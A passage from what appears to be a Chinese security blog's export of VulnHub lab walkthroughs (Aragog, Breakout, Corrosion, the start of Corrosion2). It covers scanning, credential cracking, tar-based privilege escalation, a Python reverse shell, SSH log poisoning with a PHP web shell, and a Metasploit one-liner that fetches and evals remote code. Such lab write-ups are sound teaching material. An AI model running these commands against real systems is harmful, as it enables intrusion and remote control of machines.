<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">mySecr3tPass</span><br></pre></td></tr></table></figure>

<p><img data-src="./Aragog/9.png" alt></p>
<ul>
<li>获得账号密码如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hagrid98 / $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.</span><br></pre></td></tr></table></figure>

<p><img data-src="./Aragog/10.png" alt></p>
<ul>
<li>在线破解密码</li>
</ul>
<p><img data-src="./Aragog/11.png" alt></p>
<ul>
<li>登录<code>hagrid98</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh hagrid98@192.168.1.101</span><br><span class="line">password123</span><br></pre></td></tr></table></figure>

<p><img data-src="./Aragog/12.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br><span class="line"></span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line"></span><br><span class="line">./LinEnum.sh -r report -e /tmp/ -t</span><br></pre></td></tr></table></figure>

<ul>
<li>发现备份文件</li>
</ul>
<p><img data-src="./Aragog/13.png" alt></p>
<ul>
<li>猜测此脚本为<code>root</code>运行</li>
</ul>
<p><img data-src="./Aragog/14.png" alt></p>
<p><img data-src="./Aragog/15.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<p><img data-src="./Aragog/16.png" alt></p>
<p><img data-src="./Aragog/17.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>HarryPotter</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>HarryPotter</tag>
      </tags>
  </entry>
  <entry>
    <title>Breakout</title>
    <url>/2021/10/31/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Breakout/</url>
    <content><![CDATA[<h1 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Breakout</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\napping&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.71    00:0c:29:8e:74:a1       VMware, Inc.</span><br><span class="line">192.168.1.72    00:0c:29:41:a1:f2       VMware, Inc.</span><br><span class="line">192.168.1.73    00:0c:29:2c:ea:f0       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.180   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.192   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">15 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.064 seconds (124.03 hosts/sec). 15 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.156</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.156</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Breakout&gt; nmap -sV -A -p 1-65535 192.168.1.156</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-31 16:21 EDT</span><br><span class="line">Nmap scan report for breakout.lan (192.168.1.156)</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.51 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.51 (Debian)</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">10000/tcp open  http        MiniServ 1.981 (Webmin httpd)</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">20000/tcp open  http        MiniServ 1.830 (Webmin httpd)</span><br><span class="line">|_http-title: 200 &amp;mdash; Document follows</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -7h57m47s</span><br><span class="line">|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-10-31T12:23:32</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.04 ms breakout.lan (192.168.1.156)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 46.89 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Breakout&gt; gobuster dir -u http://192.168.1.156/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.156/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/10/31 16:22:24 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 11159]</span><br><span class="line">/manual               (Status: 301) [Size: 315] [--&gt; http://192.168.1.156/manual/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                   </span><br><span class="line">                                                                                  </span><br><span class="line">===============================================================</span><br><span class="line">2021/10/31 16:24:28 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Breakout/1.png" alt></p>
<ul>
<li>右键源代码发现<code>brainfuck</code></li>
</ul>
<p><img data-src="./Breakout/2.png" alt></p>
<p>解密</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.2uqPEfj3D&lt;P'a-3</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.1.156</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">[+] Enumerating users using SID S-1-22-1 and logon username '', password ''</span><br><span class="line">S-1-22-1-1000 Unix User\cyber (Local User)</span><br><span class="line"></span><br><span class="line"> ============================================== </span><br><span class="line">|    Getting printer info for 192.168.1.156    |</span><br><span class="line"> ============================================== </span><br><span class="line">No printers returned.</span><br></pre></td></tr></table></figure>

<h3 id="登录https-192-168-1-156-20000"><a href="#登录https-192-168-1-156-20000" class="headerlink" title="登录https://192.168.1.156:20000/"></a>登录<a href="https://192.168.1.156:20000/" target="_blank" rel="noopener">https://192.168.1.156:20000/</a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cyber / .2uqPEfj3D&lt;P'a-3</span><br></pre></td></tr></table></figure>

<p><img data-src="./Breakout/3.png" alt></p>
<ul>
<li>拿到<code>webshell</code></li>
</ul>
<p><img data-src="./Breakout/4.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>发现文件</li>
</ul>
<p><img data-src="./Breakout/5.png" alt></p>
<p><img data-src="./Breakout/6.png" alt></p>
<ul>
<li>读取文件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LFILE&#x3D;&#x2F;var&#x2F;backups&#x2F;.old_pass.bak</span><br><span class="line">.&#x2F;tar xf &quot;$LFILE&quot; -I &#39;&#x2F;bin&#x2F;sh -c &quot;cat 1&gt;&amp;2&quot;&#39;</span><br><span class="line"></span><br><span class="line">.&#x2F;tar xf &#x2F;var&#x2F;backups&#x2F;.old_pass.bak -I &#39;&#x2F;bin&#x2F;sh -c &quot;cat 1&gt;&amp;2&quot;&#39;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Ts&amp;4&amp;YurgtRX(&#x3D;~h</span><br></pre></td></tr></table></figure>

<p><img data-src="./Breakout/7.png" alt></p>
<ul>
<li>弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.82",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>

<p><img data-src="./Breakout/8.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Empire</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Empire</tag>
      </tags>
  </entry>
  <entry>
    <title>Corrosion</title>
    <url>/2021/11/15/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Corrosion/</url>
    <content><![CDATA[<h1 id="Corrosion"><a href="#Corrosion" class="headerlink" title="Corrosion"></a>Corrosion</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Corrosion</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">C:\root\vulnhub\Corrosion&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.145   c0:e7:3e:cb:56:6f       (Unknown)</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.230   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">12 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.021 seconds (126.67 hosts/sec). 12 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.230</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.230</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Corrosion&gt; nmap -sV -A -p 1-65535 192.168.1.230</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 17:16 EST</span><br><span class="line">Nmap scan report for corrosion.lan (192.168.1.230)</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 0c:a7:1c:8b:4e:85:6b:16:8c:fd:b7:cd:5f:60:3e:a4 (RSA)</span><br><span class="line">|   256 0f:24:f4:65:af:50:d3:d3:aa:09:33:c3:17:3d:63:c7 (ECDSA)</span><br><span class="line">|_  256 b0:fa:cd:77:73:da:e4:7d:c8:75:a1:c5:5f:2c:21:0a (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=11/15%OT=22%CT=1%CU=38453%PV=Y%DS=1%DC=D%G=Y%M=441CA8%</span><br><span class="line">OS:TM=6192DC62%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=</span><br><span class="line">OS:A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5</span><br><span class="line">OS:B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8</span><br><span class="line">OS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S</span><br><span class="line">OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=</span><br><span class="line">OS:)T5(R=N)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G</span><br><span class="line">OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.88 ms corrosion.lan (192.168.1.230)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.48 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.230/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.230/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.230/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              zip,html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/15 17:19:02 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/tasks                (Status: 301) [Size: 314] [--&gt; http://192.168.1.230/tasks/]</span><br><span class="line">/blog-post            (Status: 301) [Size: 318] [--&gt; http://192.168.1.230/blog-post/]</span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                      </span><br><span class="line">                                                                                     </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/15 17:21:33 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.1.230/blog-post/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Corrosion&gt; gobuster dir -u http://192.168.1.230/blog-post/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,zip                   127 ⨯</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.230/blog-post/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              zip,html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/15 17:20:58 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 190]</span><br><span class="line">/archives             (Status: 301) [Size: 327] [--&gt; http://192.168.1.230/blog-post/archives/]</span><br><span class="line">/uploads              (Status: 301) [Size: 326] [--&gt; http://192.168.1.230/blog-post/uploads/] </span><br><span class="line">                                                                                              </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/15 17:23:32 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Corrosion/1.png" alt></p>
<ul>
<li>日志投毒的提示</li>
</ul>
<p><img data-src="./Corrosion/2.png" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><img data-src="./Corrosion/3.png" alt></p>
<ul>
<li>唉，靶场做多了，靶场意识…,盲猜<code>file</code>参数</li>
</ul>
<p><img data-src="./Corrosion/4.png" alt></p>
<ul>
<li>日志投毒拿<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET['c']); ?&gt;'@192.168.1.230</span><br></pre></td></tr></table></figure>

<p><img data-src="./Corrosion/5.png" alt></p>
<h3 id="MSF拿shell"><a href="#MSF拿shell" class="headerlink" title="MSF拿shell"></a><code>MSF</code>拿<code>shell</code></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 1</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.82</span><br><span class="line">set srvport 8081</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">php -d allow_url_fopen=true -r "eval(file_get_contents('http://192.168.1.82:8081/VVXggd', false, stream_context_create(['ssl'=&gt;['verify_peer'=&gt;false,'verify_peer_name'=&gt;false]])));"</span><br></pre></td></tr></table></figure>

<p><img data-src="./Corrosion/6.png" alt></p>
<p><img data-src="./Corrosion/7.png" alt></p>
<ul>
<li>发现敏感文件</li>
</ul>
<p><img data-src="./Corrosion/8.png" alt></p>
<ul>
<li>下载破解解压</li>
</ul>
<p><img data-src="./Corrosion/9.png" alt></p>
<ul>
<li>发现密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\root\vulnhub\Corrosion&gt; cat my_password.txt </span><br><span class="line">randylovesgoldfish1998</span><br></pre></td></tr></table></figure>

<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;flag</h3><p><img data-src="./Corrosion/10.png" alt></p>
<p><img data-src="./Corrosion/11.png" alt></p>
<ul>
<li>重新替换<code>easysysinfo</code>文件</li>
</ul>
<p><img data-src="./Corrosion/12.png" alt></p>
<p><img data-src="./Corrosion/13.png" alt></p>
<p><img data-src="./Corrosion/14.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Corrosion</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Corrosion</tag>
      </tags>
  </entry>
  <entry>
    <title>Corrosion2</title>
    <url>/2021/11/14/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Corrosion2/</url>
    <content><![CDATA[<h1 id="Corrosion2"><a href="#Corrosion2" class="headerlink" title="Corrosion2"></a>Corrosion2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Corrosion2</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Corrosion2&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.145   c0:e7:3e:cb:56:6f       (Unknown)</span><br><span class="line">192.168.1.166   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.135   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 1)</span><br><span class="line"></span><br><span class="line">37 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.989 seconds (128.71 hosts/sec). 13 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.166</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.166</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Corrosion2&gt; nmap -sV -A -p 1-65535 192.168.1.166</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 14:51 EST</span><br><span class="line">Nmap scan report for corrosion.lan (192.168.1.166)</span><br><span class="line">Host is up (0.0081s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)</span><br><span class="line">|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)</span><br><span class="line">|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.53</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/9.0.53</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     